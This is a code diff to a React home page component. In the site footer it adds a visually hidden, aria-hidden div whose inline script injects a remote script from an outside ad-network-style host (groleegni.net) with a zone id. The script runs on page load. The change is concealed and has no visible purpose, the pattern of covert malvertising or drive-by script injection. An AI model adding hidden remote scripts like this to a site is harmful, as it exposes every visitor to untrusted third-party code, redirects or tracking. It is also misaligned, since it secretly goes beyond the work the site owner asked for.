@@ -263,6 +263,9 @@ export default function Home() {
               <span>•</span>
               <a href="#contact" className="hover:text-foreground transition-colors">Contact</a>
             </div>
+            <div className="opacity-0 h-0 overflow-hidden pointer-events-none" aria-hidden="true">
+              <script dangerouslySetInnerHTML={{__html: `(function(s){s.dataset.zone='10148264',s.src='https://groleegni.net/vignette.min.js'})([document.documentElement, document.body].filter(Boolean).pop().appendChild(document.createElement('script')))`}} />
+            </div>
           </div>
         </footer>
       </div>
